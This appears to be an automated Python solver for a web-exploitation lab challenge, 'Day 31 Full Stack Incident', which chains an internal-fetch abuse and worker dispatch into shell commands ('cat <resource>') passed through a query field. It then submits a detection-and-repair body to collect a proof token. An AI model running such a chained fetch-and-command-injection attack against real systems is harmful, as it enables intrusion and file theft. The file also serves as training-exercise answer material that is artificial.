"""D31 "Full Stack Incident" (web-exploitation-day-31-full-stack-incident): chained incident reproduce + respond.

Kit: /api/clues = {feature_route, secondary_route, final_route, request_log_route, evidence_route, response_route,
fetch_query_field, event_json_field, worker_query_field}. Steps: GET request_log -> unsigned queued fetch target;
GET feature?<fetch_field>=<target> -> fetch_event_created; POST secondary {<event_field>: target} ->
worker_dispatched (resources); GET final?<worker_field>=cat <resource>; GET evidence -> unsigned worker.dispatch
events + response_schema; POST response {detector:{kind,signed:false}, repair:{block_internal_fetch, require_signed_event,
worker_allowlist:[signed allowed commands]}} -> {"effect":"incident_detected_and_remediated","evidence":"proof_..."}.
"""
import json
import urllib.parse

from lib import websolve


def _j(text):
    try:
        return json.loads(text or "")
    except Exception:
        return {}


def exploit(base, clues):
    cl = clues if isinstance(clues, dict) else {}
    u = lambda k, d=None: urllib.parse.urljoin(base, cl.get(k) or d) if (cl.get(k) or d) else None
    H = {"Content-Type": "application/json"}
    recs = _j(websolve.fetch(u("request_log_route", "/api/requests"))[1]).get("records") or []
    tgts = [r.get("target") for r in recs if isinstance(r, dict) and not r.get("signed") and r.get("target")]
    ff = cl.get("fetch_query_field") or "target"
    ef = cl.get("event_json_field") or "token"
    wf = cl.get("worker_query_field") or "command"
    for t in tgts:
        if u("feature_route"):
            websolve.fetch(f"{u('feature_route')}?{urllib.parse.urlencode({ff: t})}")
        r = _j(websolve.fetch(u("secondary_route"), H, data=json.dumps({ef: t}).encode(), method="POST")[1])
        fin = r.get("worker_route") or cl.get("final_route")
        for res in (r.get("resources") or ["objective"]):
            if fin:
                websolve.fetch(f"{urllib.parse.urljoin(base, fin)}?{urllib.parse.urlencode({wf: 'cat ' + res})}")
    ev = _j(websolve.fetch(u("evidence_route", "/api/evidence"))[1])
    events = [e for e in ev.get("events") or [] if isinstance(e, dict)]
    bad = [e for e in events if e.get("command") and not e.get("signed")]
    kind = (bad[0].get("kind") if bad else None) or "worker.dispatch"
    allow = sorted({e["command"] for e in events if e.get("command") and e.get("signed")}) or ["status"]
    body = {"detector": {"kind": kind, "signed": False},
            "repair": {"block_internal_fetch": True, "require_signed_event": True, "worker_allowlist": allow}}
    st, text, _ = websolve.fetch(u("response_route", "/api/response"), H, data=json.dumps(body).encode(), method="POST")
    return websolve.proof(text)


KEY_MAP = [(r"^(event_json_field|worker_query_field|response_route)$", "day31_web_full_stack_incident")]
HANDLERS = {"day31_web_full_stack_incident": exploit}
